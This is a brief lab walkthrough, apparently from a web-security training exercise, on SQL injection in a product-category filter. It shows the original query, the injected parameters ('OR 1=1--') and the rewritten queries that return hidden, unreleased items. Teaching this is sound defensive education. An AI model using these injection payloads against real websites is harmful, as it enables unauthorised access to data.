# Lab SQL injection vulnerability in WHERE clause allowing retrieval of hidden data


SQL query carried by application
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```

URL for product category
```
https://websec.net/filter?category=Gifts
https://websec.net/filter?category=Accessories
```

Modified Parameter
```
category=Gifts'+OR+1=1--
category=Accessories'+OR+1=1--
```

Proccessed SQL query:
```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since 1=1 is always true, the query will return all items. 